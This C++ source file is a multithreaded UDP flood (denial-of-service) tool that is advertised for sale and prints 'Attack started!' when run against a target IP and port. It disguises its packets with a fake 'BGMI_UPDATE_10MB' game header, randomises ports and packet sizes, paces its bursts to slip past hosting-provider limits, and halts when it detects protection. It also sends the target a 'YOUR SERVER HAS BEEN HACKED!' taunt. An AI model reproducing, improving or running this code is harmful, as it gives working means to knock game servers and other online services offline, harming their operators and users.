#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>
#include <atomic>
#include <random>
#include <sys/resource.h>
#include <netinet/in.h>
#include <sys/sysinfo.h>
#include <sched.h>
#include <time.h>

#define MAX_PACKET_SIZE 65507
#define FAKE_ERROR_DELAY 677 // Fixed exactly at 677ms
#define MIN_PACKET_SIZE 1
#define THREADS_PER_CORE 10 // Reduced for DigitalOcean

std::atomic<long long> totalPacketsSent(0);
std::atomic<long long> totalSendFailures(0);
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;
std::atomic<bool> protectionDetected(false);

int getDefaultNumThreads() {
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    return cores * THREADS_PER_CORE; // 10 threads per core
}

void preciseDelay(int milliseconds) {
    auto start = std::chrono::high_resolution_clock::now();
    struct timespec ts;
    ts.tv_sec = milliseconds / 1000;
    ts.tv_nsec = (milliseconds % 1000) * 1000000;
    nanosleep(&ts, nullptr); // Coarse sleep
    auto target = start + std::chrono::milliseconds(milliseconds);
    while (std::chrono::high_resolution_clock::now() < target) {
        // Fine-tune with busy-wait
    }
}

void countdown(int duration) {
    auto start = std::chrono::steady_clock::now();
    long long lastPackets = 0;
    for (int i = duration; i > 0 && keepSending && !protectionDetected; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if (elapsed > 0 && elapsed % 60 == 0) {
            double rate = (totalPacketsSent - lastPackets) / 60.0;
            std::cerr << "\nRate at " << elapsed << "s: " << rate << " packets/s" << std::flush;
            lastPackets = totalPacketsSent;
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (elapsed + 2 < i) {
            std::cerr << "\nCountdown stalled at " << i << "s, elapsed: " << elapsed << "s\n";
        }
        if (elapsed >= 240 && elapsed <= 300 && totalPacketsSent > 0) {
            double recentRate = (totalPacketsSent - lastPackets) / (elapsed > 240 ? elapsed - 240 : 1);
            if (recentRate < 300.0 && elapsed > 255) {
                protectionDetected = true;
                std::cerr << "\nAdvanced protection detected at " << elapsed << "s, stopping...\n";
                keepSending = false;
                break;
            }
        }
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
}

void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int basePacketSize, int numThreads) {
    // Pin thread to core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(threadId % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    int udpSocket = -1;
    struct sockaddr_in serverAddr;
    std::mt19937 rng(threadId + std::chrono::system_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> dist(0, 9999);
    std::uniform_int_distribution<int> sizeDist(basePacketSize / 2, basePacketSize);
    std::uniform_int_distribution<int> burstDelay(2, 5); // Random delay for DigitalOcean

    for (int retry = 0; retry < 3 && udpSocket < 0; ++retry) {
        udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (udpSocket < 0) {
            std::cerr << "Thread " << threadId << ": Socket creation failed, retrying (" << retry + 1 << "/3)\n";
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    if (udpSocket < 0) {
        std::cerr << "Thread " << threadId << ": Socket creation failed after retries\n";
        return;
    }

    // Try 512KB socket buffers to avoid DigitalOcean limits
    int bufferSize = 512 * 1024;
    setsockopt(udpSocket, SOL_SOCKET, SO_SNDBUF, &bufferSize, sizeof(bufferSize));
    setsockopt(udpSocket, SOL_SOCKET, SO_RCVBUF, &bufferSize, sizeof(bufferSize));

    // Verify socket buffer sizes
    int actualBufferSize;
    socklen_t optLen = sizeof(actualBufferSize);
    getsockopt(udpSocket, SOL_SOCKET, SO_SNDBUF, &actualBufferSize, &optLen);
    if (threadId == 0) {
        std::cerr << "Thread 0: Actual send buffer size: " << actualBufferSize / 1024 << " KB\n";
    }

    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = 0;
    if (bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr)) < 0) {
        std::cerr << "Thread " << threadId << ": Bind failed\n";
        close(udpSocket);
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());

    char* packet = new char[MAX_PACKET_SIZE];
    auto startTime = std::chrono::steady_clock::now();
    long long threadPackets = 0;
    long long threadFailures = 0;
    double threadDataMB = 0.0;

    while (keepSending && !protectionDetected) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        int targetPort = baseTargetPort;
        if (elapsed > 150 && elapsed % 10 == 0) {
            targetPort += (dist(rng) % 200);
        }
        serverAddr.sin_port = htons(targetPort);

        int packetSize = sizeDist(rng);
        if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) packetSize = basePacketSize;
        std::string fakeHeader = "BGMI_UPDATE_10MB|" + std::to_string(dist(rng)) + "|" + 
                                std::to_string(threadId % 100) + "|" + std::to_string(elapsed % 1000) + ":";
        int headerLen = std::min((int)fakeHeader.length(), packetSize);
        std::memcpy(packet, fakeHeader.c_str(), headerLen);
        for (int i = headerLen; i < packetSize - 1; i++) {
            packet[i] = dist(rng) % 256;
        }
        packet[packetSize - 1] = '\0';

        int burstSize = 5;
        int successfulSends = 0;
        bool sendFailed = false;
        for (int burst = 0; burst < burstSize && keepSending && !protectionDetected; burst++) {
            auto sendStart = std::chrono::steady_clock::now();
            ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                     (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            if (bytesSent > 0) {
                threadPackets++;
                threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
                successfulSends++;
            } else if (bytesSent < 0) {
                threadFailures++;
                sendFailed = true;
                auto delayStart = std::chrono::steady_clock::now();
                preciseDelay(FAKE_ERROR_DELAY);
                auto delayEnd = std::chrono::steady_clock::now();
                auto delayMs = std::chrono::duration_cast<std::chrono::milliseconds>(delayEnd - delayStart).count();
                std::cerr << "Thread " << threadId << ": Send failed at " << elapsed << "s, delay: " << delayMs << "ms\n";
                break;
            }
        }
        totalPacketsSent += successfulSends;
        totalSendFailures += threadFailures;
        threadFailures = 0;
        if (threadId == 0 && elapsed % 10 == 0) {
            std::cerr << "Thread 0 burst at " << elapsed << "s: " << successfulSends << "/" << burstSize << " sent\n";
        }
        if (!sendFailed) {
            std::this_thread::sleep_for(std::chrono::milliseconds(burstDelay(rng))); // 2-5ms for DigitalOcean
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
    delete[] packet;
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    std::string hackMessage = "YOUR SERVER HAS BEEN HACKED! TYPE 'OKAY' OR 'NO' TO RESPOND.";
    sendto(udpSocket, hackMessage.c_str(), hackMessage.length(), 0, (struct sockaddr*)&clientAddr, clientLen);

    while (keepReceiving && !protectionDetected) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::string response(buffer, bytes);
            if (response == "OKAY" || response == "NO") {
                break;
            }
        } else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(udpSocket);
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    // Increase file descriptor limit
    struct rlimit limit;
    getrlimit(RLIMIT_NOFILE, &limit);
    limit.rlim_cur = std::min(limit.rlim_max, (rlim_t)65535);
    setrlimit(RLIMIT_NOFILE, &limit);

    // Attempt to tune kernel parameters (if permitted)
    system("sysctl -w net.core.somaxconn=65535 2>/dev/null");
    system("sysctl -w net.ipv4.udp_mem='4096 87380 4194304' 2>/dev/null");

    // Log kernel settings
    system("sysctl net.core.somaxconn 2>/dev/null");
    system("sysctl net.ipv4.udp_mem 2>/dev/null");

    // Get dynamic thread count
    int DEFAULT_NUM_THREADS = getDefaultNumThreads();
    std::cout << "Detected " << sysconf(_SC_NPROCESSORS_ONLN) << " cores, using " << DEFAULT_NUM_THREADS << " threads\n";

    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "=======================================\n\n";

    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size>\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);

    if (packetSize > MAX_PACKET_SIZE || packetSize < MIN_PACKET_SIZE) {
        std::cerr << "Packet size must be between " << MIN_PACKET_SIZE << " and " << MAX_PACKET_SIZE << "\n";
        return 1;
    }

    std::cout << "Starting receiver thread...\n";
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < DEFAULT_NUM_THREADS; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, DEFAULT_NUM_THREADS);
    }

    std::cout << "\nAttack started!\n";
    auto start = std::chrono::steady_clock::now();
    std::thread countdownThread(countdown, durationSeconds);
    countdownThread.join();

    auto end = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(end - start).count();

    keepSending = false;
    for (auto& t : senderThreads) {
        t.join();
    }

    keepReceiving = false;
    receiverThread.join();

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << " packets\n";
    std::cout << "Total Send Failures: " << totalSendFailures << "\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    double totalRate = totalPacketsSent / (elapsed > 0 ? elapsed : 1);
    std::cout << "Average Rate: " << totalRate << " packets/s\n";
    if (protectionDetected) {
        std::cout << "Stopped due to advanced protection detection\n";
    }
    std::cout << "DM to buy at - @Rohan2349\n";
    return 0;
}